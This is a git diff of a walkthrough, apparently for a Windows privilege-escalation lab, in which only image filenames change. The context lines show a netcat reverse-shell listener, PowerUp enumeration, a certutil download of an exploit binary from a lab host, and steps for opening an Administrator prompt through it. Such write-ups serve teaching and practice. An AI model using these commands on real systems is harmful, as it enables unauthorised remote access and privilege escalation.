@@ -345,7 +345,7 @@ echo '</pre>';
 rlwrap nc -lvnp 9000
 ```
 
-<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (66) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -464,7 +464,7 @@ Invoke-AllChecks
 
 For this I wouldn't normally know how to detect but when you open up chrome  the exploit is already bookmarked.
 
-<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (74) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -483,7 +483,7 @@ certutil -urlcache -f http://10.10.162.126:81/hhupd.exe hhupd.exe
 
 <figure><img src="../../.gitbook/assets/image (44) (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (68) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -499,7 +499,7 @@ Navigate to **C:\Windows\System32** and type in **\*.\*** to show all files.
 
 Open the cmd prompt and it open as an Administrator account, but note if you already had Internet explorer open it won't work so make sure it is closed before starting
 
-<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (69) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (33) (2).png" alt=""><figcaption></figcaption></figure>
 
